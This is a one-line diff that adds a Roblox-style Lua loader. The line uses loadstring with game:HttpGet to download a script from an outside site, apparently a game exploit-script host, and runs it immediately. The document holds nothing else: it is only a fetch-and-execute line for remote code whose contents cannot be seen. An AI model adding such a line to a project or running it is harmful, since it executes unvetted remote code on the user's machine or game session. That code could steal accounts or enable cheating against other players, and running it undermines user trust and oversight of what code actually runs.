@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://eternal-darkness.org/loaders/11b0552e0f0ce623d370d67c0f14b723.lua"))()
